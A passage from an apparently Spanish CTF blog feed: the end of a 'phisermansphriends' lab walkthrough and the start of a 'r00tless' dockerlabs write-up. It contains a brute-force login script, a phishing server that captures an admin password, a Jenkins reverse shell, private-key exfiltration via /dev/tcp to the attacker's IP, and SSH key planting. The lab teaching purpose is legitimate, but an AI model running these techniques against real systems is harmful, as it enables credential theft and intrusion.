                                <span class="sh">"</span><span class="s">_url</span><span class="sh">"</span><span class="p">:</span> <span class="sh">""</span><span class="p">,</span> <span class="sh">"</span><span class="s">_user</span><span class="sh">"</span><span class="p">:</span> <span class="n">settings</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">],</span> <span class="sh">"</span><span class="s">_pass</span><span class="sh">"</span><span class="p">:</span> <span class="n">login</span><span class="p">},</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span>
                          <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">)</span>

        <span class="nf">if </span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">302</span><span class="p">):</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Succes with %s:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">settings</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">],</span> <span class="n">login</span><span class="p">))</span>
            <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Code: </span><span class="si">{</span><span class="n">r</span><span class="p">.</span><span class="n">status_code</span><span class="si">}</span><span class="s"> - passw: </span><span class="si">{</span><span class="n">login</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">ex</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">verify</span><span class="p">():</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">settings</span><span class="p">[</span><span class="sh">'</span><span class="s">url</span><span class="sh">'</span><span class="p">]</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">token</span> <span class="o">=</span> <span class="nf">parse_token</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
        <span class="nf">if</span><span class="p">(</span><span class="n">token</span> <span class="o">==</span> <span class="sh">""</span><span class="p">):</span>
            <span class="k">return</span> <span class="bp">False</span>
        <span class="k">return</span> <span class="bp">True</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">ex</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">False</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="n">passwords</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">mur.txt</span><span class="sh">"</span><span class="p">).</span><span class="nf">read</span><span class="p">().</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>

    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">%d passwords loaded</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">passwords</span><span class="p">)))</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Trying with username %s</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">settings</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]))</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">-----------------------------------------------------</span><span class="sh">"</span><span class="p">)</span>

    <span class="nf">if</span><span class="p">(</span><span class="ow">not</span> <span class="nf">verify</span><span class="p">()):</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
    <span class="n">pool</span> <span class="o">=</span> <span class="nc">ThreadPool</span><span class="p">(</span><span class="n">settings</span><span class="p">[</span><span class="sh">'</span><span class="s">threads</span><span class="sh">'</span><span class="p">])</span>
    <span class="n">results</span> <span class="o">=</span> <span class="n">pool</span><span class="p">.</span><span class="nf">map</span><span class="p">(</span><span class="n">brute</span><span class="p">,</span> <span class="n">passwords</span><span class="p">)</span>
    <span class="n">pool</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    <span class="n">pool</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>

    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">-----------------------------------------------------</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">The End</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>

<p>Lo ejecutamos usando 25 hilos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python brute.py <span class="nt">-t</span> 25
...
Code: 401 - passw: Mur_5901990
Code: 401 - passw: 05199090
Code: 401 - passw: Mur99051990
Succes with mur.rusko@phisermansphriends.thl:MurRusko_90
Code: 401 - passw: Rusko1990
Code: 401 - passw: Rusko05
...
</code></pre></div></div>

<p>Encontramos la clave de acceso de <strong>mur.rusko</strong> para el servicio de mail.</p>

<p>Ahora vamos intentar hacer phishing para obtener las credenciales de <strong>intranet.phisermansphriends.thl</strong>.</p>

<p>Primero ponemos a la escucha un servidor en python que acepte <strong>GET</strong> y POST:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">http.server</span> <span class="kn">import</span> <span class="n">BaseHTTPRequestHandler</span><span class="p">,</span> <span class="n">HTTPServer</span>

<span class="k">class</span> <span class="nc">RequestHandler</span><span class="p">(</span><span class="n">BaseHTTPRequestHandler</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">do_GET</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">path</span> <span class="o">==</span> <span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="n">path</span> <span class="o">=</span> <span class="sh">'</span><span class="s">/index.html</span><span class="sh">'</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">file_path</span> <span class="o">=</span> <span class="sh">'</span><span class="s">.</span><span class="sh">'</span> <span class="o">+</span> <span class="n">self</span><span class="p">.</span><span class="n">path</span>
            <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
                <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">file_path</span><span class="p">.</span><span class="nf">endswith</span><span class="p">(</span><span class="sh">'</span><span class="s">.html</span><span class="sh">'</span><span class="p">):</span>
                    <span class="n">self</span><span class="p">.</span><span class="nf">send_header</span><span class="p">(</span><span class="sh">"</span><span class="s">Content-type</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">text/html</span><span class="sh">"</span><span class="p">)</span>
                <span class="n">self</span><span class="p">.</span><span class="nf">end_headers</span><span class="p">()</span>
                <span class="n">self</span><span class="p">.</span><span class="n">wfile</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nb">file</span><span class="p">.</span><span class="nf">read</span><span class="p">())</span>
        <span class="k">except</span> <span class="nb">FileNotFoundError</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_header</span><span class="p">(</span><span class="sh">"</span><span class="s">Content-type</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">text/plain</span><span class="sh">"</span><span class="p">)</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">end_headers</span><span class="p">()</span>
            <span class="n">self</span><span class="p">.</span><span class="n">wfile</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">404 Not Found</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">do_POST</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">content_length</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="sh">'</span><span class="s">Content-Length</span><span class="sh">'</span><span class="p">])</span>
        <span class="n">body</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">rfile</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="n">content_length</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">send_header</span><span class="p">(</span><span class="sh">'</span><span class="s">Content-type</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">text/plain</span><span class="sh">'</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">end_headers</span><span class="p">()</span>
        <span class="n">self</span><span class="p">.</span><span class="n">wfile</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Received POST request with body: </span><span class="sh">"</span> <span class="o">+</span> <span class="n">body</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">body</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">run_server</span><span class="p">():</span>
    <span class="n">server_address</span> <span class="o">=</span> <span class="p">(</span><span class="sh">''</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
    <span class="n">httpd</span> <span class="o">=</span> <span class="nc">HTTPServer</span><span class="p">(</span><span class="n">server_address</span><span class="p">,</span> <span class="n">RequestHandler</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Server running on port 80...</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">httpd</span><span class="p">.</span><span class="nf">serve_forever</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="nf">run_server</span><span class="p">()</span>
</code></pre></div></div>

<p>Nos guardamos la web de login para mandar al admin</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://intranet.phisermansphriends.thl/login <span class="nt">-o</span> index.html
</code></pre></div></div>

<p>Y nos ponemos a la escucha:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python server.py
Server running on port 80...
</code></pre></div></div>

<p>Ahora vamos a mandarle un email a admin desde el servicio de mail:</p>

<p><img src="/assets/images/phisermans/1.png" alt="image" /></p>

<p>Ahora esperamos a que nos responda el admin:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python server.py
Server running on port 80...
10.0.2.15 - - <span class="o">[</span>30/Aug/2024 22:29:54] <span class="s2">"GET / HTTP/1.1"</span> 200 -
10.0.2.15 - - <span class="o">[</span>30/Aug/2024 22:30:09] <span class="s2">"POST / HTTP/1.1"</span> 200 -
b<span class="s1">'j_username=admin&amp;j_password=RqykJVKDt2RBjnR2q1zeIMYm&amp;from=%2F&amp;Submit='</span>
</code></pre></div></div>

<p>Nos logeamos en intranet con las credenciales que acabamos de conseguir.</p>

<p><img src="/assets/images/phisermans/2.png" alt="image" /></p>

<p>Como sabemos, podemos obtener una reverse shell ejecutando un script escrito en Groovy desde Jenkins. En esta máquina solo podemos obtener la shell usando el puerto <strong>443</strong>, ya que el resto de puertos están cerrados.</p>

<p><img src="/assets/images/phisermans/3.png" alt="image" /></p>

<p>Obtenemos la shell:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>murrusko: 
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.0.2.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.2.15] 49810

script /dev/null <span class="nt">-qc</span> bash
jenkins@phisermansphriends:~<span class="nv">$ </span>^Z
</code></pre></div></div>

<p>Hacemos el tratamiento de la TTY y estamos dentro del sistema.</p>

<p>Miramos que usuarios hay en el sistema y vemos que hay 2 usuarios más además de el usario root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jenkins@phisermansphriends:~<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep </span>bash
root:x:0:0:root:/root:/bin/bash
mur:x:1000:1000:Mur Rusko,,,:/home/mur:/bin/bash
jenkins:x:106:115:Jenkins,,,:/var/lib/jenkins:/bin/bash
sysadmin:x:1001:1001:sysadmin,,,:/home/sysadmin:/bin/bash
</code></pre></div></div>

<p>Vamos a probar a reusar la pass de <strong>mur.rusko</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jenkins@phisermansphriends:~<span class="nv">$ </span>su mur
Contraseña: 
mur@phisermansphriends:/var/lib/jenkins<span class="err">$</span>
</code></pre></div></div>

<p>Vemos que ha funcionado, listamos el home del usuario y vemos un fichero <strong>.password</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mur@phisermansphriends:/var/lib/jenkins<span class="nv">$ </span><span class="nb">cd</span> ~
mur@phisermansphriends:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 32
drwx------ 3 mur  mur  4096 ago 30 04:54 <span class="nb">.</span>
drwxr-xr-x 5 root root 4096 ago 30 03:50 ..
lrwxrwxrwx 1 mur  mur     9 ago 30 03:40 .bash_history -&gt; /dev/null
<span class="nt">-rw-r--r--</span> 1 mur  mur   220 ago 29 14:23 .bash_logout
<span class="nt">-rw-r--r--</span> 1 mur  mur  3526 ago 29 14:23 .bashrc
drwxr-xr-x 3 mur  mur  4096 ago 30 03:55 .local
<span class="nt">-r--------</span> 1 mur  mur    34 ago 30 04:54 .password
<span class="nt">-rw-r--r--</span> 1 mur  mur   807 ago 29 14:23 .profile
<span class="nt">-r--------</span> 1 mur  mur    33 ago 30 03:55 user.txt
</code></pre></div></div>

<p>Lo abrimos y vemos lo que parece una contraseña de un script:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mur@phisermansphriends:~<span class="nv">$ </span><span class="nb">cat</span> .password 
<span class="k">if </span>password <span class="o">!=</span> <span class="s1">'SuperSecretPass'</span>:
</code></pre></div></div>

<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>

<p>Enumeramos si puede ejecutar algún comando como root:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mur@phisermansphriends:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>mur on phisermansphriends:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin,
    use_pty

User mur may run the following commands on phisermansphriends:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/python3 /opt/util.py
</code></pre></div></div>

<p>Vemos que no podemos leer el script:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mur@phisermansphriends:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /opt/
total 4
<span class="nt">-r--------</span> 1 root root 1751 ago 30 04:41 util.py
</code></pre></div></div>

<p>Probamos a ejecutarlo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mur@phisermansphriends:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/python3 /opt/util.py
Escuchando en localhost:443
Escuchando en localhost:443
</code></pre></div></div>

<p>Lo único que vemos es que esta a la escucha en localhost en el puerto 443.</p>

<p>Intentamos conectarnos por SSH pero vemos que no podemos conectarnos usando la password;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh mur@10.0.2.15 
mur@10.0.2.15: Permission denied <span class="o">(</span>publickey<span class="o">)</span><span class="nb">.</span>
</code></pre></div></div>

<p>Generamos las claves publica/privada y la añadimos al fichero <strong>authorized_keys</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mur@phisermansphriends:~<span class="nv">$ </span>ssh-keygen <span class="nt">-t</span> rsa <span class="nt">-b</span> 4096

mur@phisermansphriends:~<span class="nv">$ </span><span class="nb">cat</span> ~/.ssh/id_rsa.pub <span class="o">&gt;&gt;</span> ~/.ssh/authorized_keys
mur@phisermansphriends:~<span class="nv">$ </span><span class="nb">chmod </span>600 ~/.ssh/authorized_keys
</code></pre></div></div>

<p>Nos mandamos a nuestra máquina la clave privada, pero por el puerto 443:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># mandamos por el puerto 443</span>
mur@phisermansphriends:~<span class="nv">$ </span><span class="nb">cat</span> .ssh/id_rsa <span class="o">&gt;</span> /dev/tcp/10.0.2.5/443

<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443 <span class="o">&gt;</span> id_mur
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>murrusko: 
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.0.2.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.2.15] 43688
</code></pre></div></div>

<p>Le cambiamos los permisos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">chmod </span>400 id_mur
</code></pre></div></div>

<p>Y nos conectamos</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> id_mur mur@10.0.2.15
Linux phisermansphriends.thl 6.1.0-23-amd64 <span class="c">#1 SMP PREEMPT_DYNAMIC Debian 6.1.99-1 (2024-07-15) x86_64</span>
.-. <span class="nb">.</span> <span class="nb">.</span> .-. .-. .-. .-. <span class="nb">.</span>  <span class="nb">.</span> .-. <span class="nb">.</span> <span class="nb">.</span> .-. 
|-<span class="s1">' |-|  |  `-. |-  |(  |\/| |-| |\| `-. 
'</span>   <span class="s1">' ` `-'</span> <span class="sb">`</span>-<span class="s1">' `-'</span> <span class="s1">' '</span> <span class="s1">'  ` ` '</span> <span class="s1">' ` `-'</span>
.-. <span class="nb">.</span> <span class="nb">.</span> .-. .-. .-. <span class="nb">.</span> <span class="nb">.</span> .-. .-. 
|-<span class="s1">' |-| |(   |  |-  |\| |  )`-. 
'</span>   <span class="s1">' ` '</span> <span class="s1">' `-'</span> <span class="sb">`</span>-<span class="s1">' '</span> <span class="sb">`</span> <span class="sb">`</span>-<span class="s1">' `-'</span> 
Last login: Thu Aug 29 15:11:20 2024
mur@phisermansphriends:~<span class="err">$</span>
</code></pre></div></div>

<p>Ahora ya podemos conectarnos al socket:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mur@phisermansphriends:~<span class="nv">$ </span>telnet localhost 443
Trying ::1...
Connection failed: Conexión rehusada
Trying 127.0.0.1...
Connected to localhost.
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
Password: SuperSecretPass
Hola admin!

Que hacemos: 
<span class="o">[</span>1] Ver procesos
<span class="o">[</span>2] Ver espacio libre
<span class="o">[</span>3] Ver sockets
<span class="o">[</span>4] Salir
h
</code></pre></div></div>

<p>Metemos la clave que habíamos encontrado y en provocamos un fallo introduciendo un carácter en vez de un dígito.  Como vemos en la otra terminal, donde ejecutamos el socket, que nos muestra un error. La librería Pdb tiene un modo interactivo que nos permite ejecutar código en python. Entramos con interactive y abrimos una shell:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mur@phisermansphriends:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/python3 /opt/util.py
Escuchando en localhost:443
invalid literal <span class="k">for </span>int<span class="o">()</span> with base 10: b<span class="s1">'h'</span>
<span class="o">&gt;</span> /opt/util.py<span class="o">(</span>29<span class="o">)</span>&lt;module&gt;<span class="o">()</span>
-&gt; option <span class="o">=</span> int<span class="o">(</span>clientsock.recv<span class="o">(</span>1024<span class="o">)</span>.strip<span class="o">())</span>
<span class="o">(</span>Pdb<span class="o">)</span> interact
<span class="k">*</span>interactive<span class="k">*</span>
<span class="o">&gt;&gt;&gt;</span> import pty
<span class="o">&gt;&gt;&gt;</span> pty.spawn<span class="o">(</span><span class="s1">'/bin/bash'</span><span class="o">)</span>
root@phisermansphriends:/home/mur#
</code></pre></div></div>

<p>Espero que os haya gustado.</p>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="thl" /><category term="ctf" /><category term="linux" /><category term="profesional" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">r00tless</title><link href="/posts/r00tless/" rel="alternate" type="text/html" title="r00tless" /><published>2024-09-02T00:00:00+00:00</published><updated>2024-09-02T00:00:00+00:00</updated><id>/posts/r00tless</id><content type="html" xml:base="/posts/r00tless/"><![CDATA[<p><img src="/assets/images/r00tless/r00tless.png" alt="image" /></p>

<p>Estamos ante un docker que contiene una distribución Linux. Es de nivel difícil y es de la plataforma <a href="https://dockerlabs.es/">dockerlabs</a>.</p>

<h1 id="enumeración">Enumeración</h1>

<p>Ponemos el docker en marcha con el <code class="language-plaintext highlighter-rouge">auto_deploy.sh</code> que trae el zip. Cuando termina de cargar nos indica la dirección IP de nuestra víctima, en nuestro caso es <code class="language-plaintext highlighter-rouge">172.18.0.2</code>.</p>

<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> y que use el modo agresivo <code class="language-plaintext highlighter-rouge">-T 4</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">172.18.0.2</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-T</span> 4 <span class="nt">-v</span> 172.18.0.2
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
</code></pre></div></div>

<p>Vemos que tiene los puertos <strong>22, 80, 139, 445</strong> abiertos. Vamos a realizar otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code> pero esta vez para detectar la versión del servicio que este corriendo, <code class="language-plaintext highlighter-rouge">-sV</code>, y para ejecutar los scripts por defecto para detectar vulnerabilidades, <code class="language-plaintext highlighter-rouge">-sC</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80,139,445 <span class="nt">-v</span> 172.18.0.2
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 fa:7b:d3:96:f6:83:bb:bd:24:86:b4:a8:f6:59:c3:62 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 29:49:38:ae:44:75:d8:88:2a:b6:98:55:00:bd:24:76 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp  open  http        Apache httpd 2.4.58 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)</span>
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Subir Archivo
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
</code></pre></div></div>

<p>Enumeramos <strong>samba:</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>enum4linux <span class="nt">-a</span> 172.18.0.2
Sharename       Type      Comment
        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
        print<span class="nv">$ </span>         Disk      Printer Drivers
        read_only_share Disk      
        IPC<span class="nv">$ </span>           IPC       IPC Service <span class="o">(</span>64a2dd61671c server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>

S-1-22-1-1000 Unix User<span class="se">\r</span>oot-false <span class="o">(</span>Local User<span class="o">)</span>
S-1-22-1-1001 Unix User<span class="se">\s</span>ambauser <span class="o">(</span>Local User<span class="o">)</span>
S-1-22-1-1002 Unix User<span class="se">\l</span>ess <span class="o">(</span>Local User<span class="o">)</span>
S-1-22-1-1003 Unix User<span class="se">\p</span>asssamba <span class="o">(</span>Local User<span class="o">)</span>
</code></pre></div></div>

<p>Entre otras cosas encontramos un recurso compartido, <strong>read_only_share</strong>, y cuatro usuarios: <strong>root-false, sambauser, less y passsamba</strong>.</p>

<p>Ahora pasamos a enumerar el servicio web. Primero hacemos un ataque de fuerza bruta para encontrar directorios y ficheros:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>feroxbuster <span class="nt">-u</span> http://172.18.0.2 <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt <span class="nt">-r</span> <span class="nt">-d</span> 1 <span class="nt">-x</span> .php,.txt,.zip
200      GET        1l       10w       56c http://172.18.0.2/upload.php
200      GET       94l      183w     2410c http://172.18.0.2/
200      GET        2l       16w       78c http://172.18.0.2/readme.txt
</code></pre></div></div>

<p>Llama la atención el fichero <strong>readme.txt</strong>. Lo vemos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://172.18.0.2/readme.txt

It may be that the file that is being uploaded is being uploaded <span class="k">in </span>a .ssh/?
</code></pre></div></div>

<p>Parece que la url <a href="http://172.18.0.2/upload.php"><strong>http://172.18.0.2/upload.php</strong></a> sube el fichero al directorio <strong>.ssh</strong> de alguno de los usuarios que hemos descubierto. Vamos a crear un par de claves públicas/privadas:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Creamos las claves</span>
<span class="nv">$ </span>ssh-keygen <span class="nt">-t</span> rsa <span class="nt">-b</span> 4096

<span class="c"># Creamos el fichero authorized_keys</span>
<span class="nv">$ </span><span class="nb">cat </span>id.pub <span class="o">&gt;</span> authorized_keys
</code></pre></div></div>

<p>Subimos el fichero <strong>authorized_keys:</strong></p>

<p><img src="/assets/images/r00tless/1.png" alt="image" /></p>

<p>No sabemos a que usuario pertenece el directorio <strong>.ssh.</strong> En este caso voy a usar el script <strong>patator</strong>. Primero creamos un fichero <strong>users.txt</strong> con los nombres de los usuarios que hemos descubierto y después ejecutamos el script:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>patator ssh_login <span class="nv">host</span><span class="o">=</span>172.18.0.2 <span class="nv">user</span><span class="o">=</span>FILE0 <span class="nv">keyfile</span><span class="o">=</span><span class="nb">id </span><span class="nv">0</span><span class="o">=</span>users.txt
23:37:20 patator    INFO - code  size    <span class="nb">time</span> | candidate                          |   num | mesg
23:37:20 patator    INFO - <span class="nt">-----------------------------------------------------------------------------</span>
23:37:21 patator    INFO - 1     22     0.072 | root-false                         |     1 | Authentication failed.
23:37:21 patator    INFO - 1     22     0.018 | sambauser                          |     2 | Authentication failed.
23:37:21 patator    INFO - 0     40     0.025 | passsamba                          |     3 | SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5
</code></pre></div></div>

<p>Como podemos ver con el user <strong>passsamba</strong> obtendríamos acceso al sistema.</p>

<h1 id="intrusión">Intrusión</h1>

<p>Nos conectamos al sistema usando la clave privada:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh <span class="nt">-i</span> <span class="nb">id </span>passsamba@172.18.0.2
Welcome to Ubuntu 24.04 LTS <span class="o">(</span>GNU/Linux 6.8.11-amd64 x86_64<span class="o">)</span>
passsamba@64a2dd61671c:~<span class="err">$</span>
</code></pre></div></div>

<p>Leemos el fichero <strong>note.txt</strong>:</p>

